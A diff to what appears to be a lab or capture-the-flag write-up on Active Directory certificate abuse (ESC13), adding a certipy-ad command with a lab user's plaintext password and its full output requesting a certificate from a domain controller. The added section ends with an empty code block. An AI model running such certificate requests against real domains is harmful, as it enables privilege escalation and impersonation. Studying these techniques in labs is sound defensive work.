@@ -295,6 +295,34 @@ This group has GenericAll on `schlop`
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked
 
 ```python
+❯❯❯ certipy-ad req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip '10.1.176.128' -dc-host 'dc01.kitsune.local' -target 'dc01.kitsune.local' -target-ip '10.1.176.128' -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -debug -key-size 4096
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.1.176.128'
+[+] DC IP: '10.1.176.128'
+[+] DC Host: 'dc01.kitsune.local'
+[+] Target IP: '10.1.176.128'
+[+] Remote Name: 'dc01.kitsune.local'
+[+] Domain: 'KITSUNE.LOCAL'
+[+] Username: 'RANCH'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.1.176.128[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.1.176.128[\pipe\cert]
+[*] Request ID is 21
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'ranch@kitsune.local'
+[+] Found SID in security extension: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
+[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
+[*] Saving certificate and private key to 'ranch.pfx'
+[+] Attempting to write data to 'ranch.pfx'
+[+] Data written to 'ranch.pfx'
+[*] Wrote certificate and private key to 'ranch.pfx'
+```
+
+I now have the PFX
+
+```python
 
 ```
 
